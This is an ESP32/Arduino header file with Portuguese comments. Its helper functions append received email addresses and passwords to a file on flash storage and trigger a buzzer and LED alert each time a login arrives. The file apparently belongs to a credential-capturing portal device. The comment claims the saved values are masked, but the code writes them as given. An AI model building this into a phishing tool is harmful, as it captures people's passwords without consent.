#ifndef UTILS_H
#define UTILS_H

#include <Arduino.h>
#include <SPIFFS.h>
#include "config.h"

// Função para mascarar entradas, mostrando só 1º e último caractere
String mask(String input)
{
    if (input.length() < 2)
        return "*";
    String result = input.substring(0, 1);
    for (int i = 0; i < input.length() - 2; i++)
        result += "*";
    result += input.substring(input.length() - 1);
    return result;
}

// Salva o email e senha mascarados no arquivo data.txt
void saveLogin(String email, String pass)
{
    File file = SPIFFS.open("/data.txt", FILE_APPEND);
    if (!file)
        return;
    file.printf("Email: %s | Senha: %s\n", email.c_str(), pass.c_str());
    file.close();
}

// Função para tocar o buzzer e piscar LED quando receber login
void signalLoginReceived()
{
    // Pisca o LED e toca o buzzer ao receber o login
    tone(BUZZER_PIN, 1000);
    Serial.println("RECEBIDO!!!");
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    tone(BUZZER_PIN, 5000);
    digitalWrite(LED_PIN, LOW);
    delay(200);
    tone(BUZZER_PIN, 7000);
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    tone(BUZZER_PIN, 0);
    digitalWrite(LED_PIN, LOW);
    delay(200);
}

#endif
